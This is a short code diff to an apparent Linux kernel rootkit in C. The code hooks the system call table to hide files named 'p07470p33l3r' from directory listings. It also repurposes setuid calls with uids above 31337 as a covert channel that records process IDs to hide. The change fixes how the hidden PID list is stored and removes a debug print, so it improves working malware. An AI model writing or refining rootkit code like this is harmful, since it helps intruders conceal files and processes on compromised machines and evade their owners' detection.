@@ -41,7 +41,7 @@ typedef unsigned long psize; // Set custom var psize to 8 bytes (64bits)
 psize *system_call_table; // Store syscall table location
 
 char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
-char *hidden_PIDs[50];
+char hidden_PIDs[50][5];
 int index = 0;
 
 /* Hacked Syscall Pointers */
@@ -149,7 +149,6 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 /* This is used for interfacing with the rootkit to hide processes. */
 
 asmlinkage int hacked_setuid(uid_t uid){
-	printk("test\n");
 	if(uid > 31337){
 		sprintf(hidden_PIDs[index++], "%d", (uid - 31337));
 		printk("PID = %d\n", (uid - 31337));
